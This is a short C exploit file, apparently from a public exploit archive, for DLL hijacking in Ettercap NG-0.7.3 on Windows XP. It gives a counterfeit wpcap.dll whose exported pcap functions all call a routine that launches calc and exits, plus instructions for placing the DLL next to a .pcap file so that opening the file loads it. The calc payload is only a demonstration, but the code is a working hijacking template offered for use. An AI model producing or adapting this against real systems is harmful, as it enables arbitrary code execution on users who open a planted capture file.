/*
Exploit Title:  Ettercap NG-0.7.3 DLL hijacking (wpcap.dll)
Date: 25/08/2010
Author: Teo Manojlovic
Tested on: Windows XP SP3
Vulnerable extensions: .pcap
Compile and rename to wpcap.dll, create a file in the same dir .pcap extension
and visit http://chaossecurity.wordpress.com/
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)


DLLIMPORT void pcap_findalldevs() { evil(); }
DLLIMPORT void pcap_close() { evil(); }
DLLIMPORT void pcap_compile() { evil(); }
DLLIMPORT void pcap_datalink() { evil(); }
DLLIMPORT void pcap_datalink_val_to_description() { evil(); }
DLLIMPORT void pcap_dump() { evil(); }
DLLIMPORT void pcap_dump_close() { evil(); }
DLLIMPORT void pcap_dump_open() { evil(); }
DLLIMPORT void pcap_file() { evil(); }
DLLIMPORT void pcap_freecode() { evil(); }
DLLIMPORT void pcap_geterr() { evil(); }
DLLIMPORT void pcap_getevent() { evil(); }
DLLIMPORT void pcap_lib_version() { evil(); }
DLLIMPORT void pcap_lookupdev() { evil(); }
DLLIMPORT void pcap_lookupnet() { evil(); }
DLLIMPORT void pcap_loop() { evil(); }
DLLIMPORT void pcap_open_live() { evil(); }
DLLIMPORT void pcap_open_offline() { evil(); }
DLLIMPORT void pcap_setfilter() { evil(); }
DLLIMPORT void pcap_snapshot() { evil(); }
DLLIMPORT void pcap_stats() { evil(); }
int evil()

{
  WinExec("calc", 0);
  exit(0);
  return 0;
}


